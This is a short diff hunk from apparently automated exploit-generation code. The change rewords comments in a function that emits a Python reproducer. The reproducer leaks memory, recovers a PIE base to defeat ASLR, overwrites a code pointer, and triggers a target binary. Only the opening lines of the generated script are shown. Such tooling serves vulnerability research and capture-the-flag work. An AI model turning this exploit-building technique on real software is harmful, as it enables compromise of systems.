@@ -562,14 +562,14 @@ def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, *, blame, write
 
 
 def _pie_repro_script(win_name, win_vaddr, leak_opt, writer, off, trig) -> bytes:
-    """A self-contained, stdlib-only reproducer: leak -> recover the PIE base from the target's own
+    """A self-contained, stdlib-based reproducer: leak -> recover the PIE base from the target's own
     symbols -> overwrite the code pointer with base+win_vaddr -> trigger. The base recovery mirrors
     exploit.recover_pie_base (page-offset match, >=2 corroborating leaked slots), so the PoC is a
     genuine ASLR defeat, not a hardcoded address."""
     trig_send = "" if trig is None else f"send({trig!r}+'\\n')\n"
     return (
         "#!/usr/bin/env python3\n"
-        "# PIE leak-then-chain reproducer (stdlib only). Usage: python3 exploit.py ./target.bin\n"
+        "# PIE leak-then-chain reproducer (stdlib based). Usage: python3 exploit.py ./target.bin\n"
         "import subprocess, select, os, re, struct, sys, time, collections\n"
         f"WIN_VADDR={win_vaddr:#x}; LEAK={leak_opt!r}; WRITER={writer!r}; OFF={off}\n"
         "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
